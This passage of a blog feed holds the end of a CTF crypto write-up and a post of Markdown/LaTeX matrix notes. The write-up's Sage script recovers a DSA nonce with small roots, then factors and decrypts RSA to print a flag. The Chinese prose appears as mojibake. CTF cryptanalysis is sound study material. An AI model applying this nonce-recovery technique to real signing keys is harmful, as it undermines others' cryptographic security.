style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">æ‰€</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">æœ‰</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p>ä¹‹ååˆ©ç”¨small_rootsæ±‚è§£å‡ºkï¼Œç„¶åæ­£å¸¸è§£å¯†å‡ºxå°±å¾—åˆ°äº†msgä¸­å¾—e</p><p>ä¹‹åå¾—RSAéœ€è¦åˆ©ç”¨Cæ±‚å‡ºpå’Œqï¼Œä½†æ˜¯ç›´æ¥ç”¨sagemathä¸­å¾—two_squareså¾—æ±‚å‡ºæ¥å¾—ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œä¹‹åå°±æ‰¾äº†ä¸ªè¿™ä¸ªç½‘ç«™å¯ä»¥å¤šä¸ªè§£ï¼Œç„¶åæ…¢æ…¢è¯•ï¼š</p><p><a href="https://www.alpertron.com.ar/QUAD.HTM">Generic two integer variable equation solver</a></p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/GCB2024/1.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/GCB2024/2.png" alt="" /></div></div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>(H1, r1, s1) = <span class="hljs-number">659787401883545685817457221852854226644541324571</span>, <span class="hljs-number">334878452864978819061930997065061937449464345411</span>, <span class="hljs-number">282119793273156214497433603026823910474682900640</span><br>(H2, r2, s2) = <span class="hljs-number">156467414524100313878421798396433081456201599833</span>, <span class="hljs-number">584114556699509111695337565541829205336940360354</span>, <span class="hljs-number">827371522240921066790477048569787834877112159142</span><br><br>p = <span class="hljs-number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span><br>q = <span class="hljs-number">829396411171540475587755762866203184101195238207</span><br>g = <span class="hljs-number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span><br><br>x=(H1*r2-H2*r1)%q<br><br>PR.&lt;k&gt;=PolynomialRing(Zmod(q))<br>f=s1*r2*k-s2*r1*k^<span class="hljs-number">2</span>-x<br>f=f.monic()<br>k=<span class="hljs-built_in">int</span>(f.small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">64</span>, beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)[<span class="hljs-number">0</span>])<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(((s1*k-H1)*inverse(r1,q))%q)))<br><span class="hljs-comment">#b&#x27;e = 44519&#x27;</span><br>c = <span class="hljs-number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span><br>C = <span class="hljs-number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span><br><br>p=<span class="hljs-number">302951519846417861008714825074296492447</span><br>q=<span class="hljs-number">295488723650623654106370451762393175957</span><br>e = <span class="hljs-number">44519</span><br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse_mod(e,phi)<br>m=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;EZ_DSA_@nd_C0mplex_QAQ&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
      <tag>Curve</tag>
      
      <tag>DSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•Markdownçš„ä¸€äº›å†™æ³•</title>
    <link href="/2024/12/05/markdown/"/>
    <url>/2024/12/05/markdown/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡ç”¨æ¥è®°å½•å†™markdownæ—¶é‡åˆ°çš„é—®é¢˜</p><h1 id="latex"><a class="markdownIt-Anchor" href="#latex"></a> LaTex</h1><blockquote><p>å‚è€ƒ: <a href="https://blog.csdn.net/wzk4869/article/details/126863936">https://blog.csdn.net/wzk4869/article/details/126863936</a></p></blockquote><h2 id="å¸Œè…Šå­—æ¯"><a class="markdownIt-Anchor" href="#å¸Œè…Šå­—æ¯"></a> å¸Œè…Šå­—æ¯</h2><p><img src="/imgs/markdown/1.png" alt="" /></p><h2 id="æ•°å­¦ç»“æ„"><a class="markdownIt-Anchor" href="#æ•°å­¦ç»“æ„"></a> æ•°å­¦ç»“æ„</h2><p><img src="/imgs/markdown/2.png" alt="" /></p><h2 id="å¤§ç¬¦å·"><a class="markdownIt-Anchor" href="#å¤§ç¬¦å·"></a> å¤§ç¬¦å·</h2><p><img src="/imgs/markdown/3.png" alt="" /></p><h2 id="å‡½æ•°"><a class="markdownIt-Anchor" href="#å‡½æ•°"></a> å‡½æ•°</h2><p><img src="/imgs/markdown/4.png" alt="" /></p><h2 id="è¿ç®—ç¬¦å·"><a class="markdownIt-Anchor" href="#è¿ç®—ç¬¦å·"></a> è¿ç®—ç¬¦å·</h2><p><img src="/imgs/markdown/5.png" alt="" /></p><h2 id="ç®­å¤´ç¬¦å·"><a class="markdownIt-Anchor" href="#ç®­å¤´ç¬¦å·"></a> ç®­å¤´ç¬¦å·</h2><p><img src="/imgs/markdown/6.png" alt="" /></p><h2 id="çŸ©é˜µ"><a class="markdownIt-Anchor" href="#çŸ©é˜µ"></a> çŸ©é˜µ</h2><h3 id="æ— æ‹¬å·"><a class="markdownIt-Anchor" href="#æ— æ‹¬å·"></a> æ— æ‹¬å·</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>matrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>matrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6000000000000005em;vertical-align:-1.5500000000000007em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="ä¸­æ‹¬å·"><a class="markdownIt-Anchor" href="#ä¸­æ‹¬å·"></a> ä¸­æ‹¬å·</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>bmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>bmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â£</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â¢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â¡</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â¦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â¥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â¤</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="å¤§æ‹¬å·"><a class="markdownIt-Anchor" href="#å¤§æ‹¬å·"></a> å¤§æ‹¬å·</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>Bmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>Bmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\begin{Bmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{Bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.49999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â©</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>âª</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â¨</span></span></span><span style="top:-4.00501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>âª</span></span></span><span style="top:-4.30002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â§</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.49999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â­</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>âª</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â¬</span></span></span><span style="top:-4.00501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>âª</span></span></span><span style="top:-4.30002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>â«</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="ç«–çº¿è¡Œåˆ—å¼"><a class="markdownIt-Anchor" href="#ç«–çº¿è¡Œåˆ—å¼"></a> ç«–çº¿(è¡Œåˆ—å¼)</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>vmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span 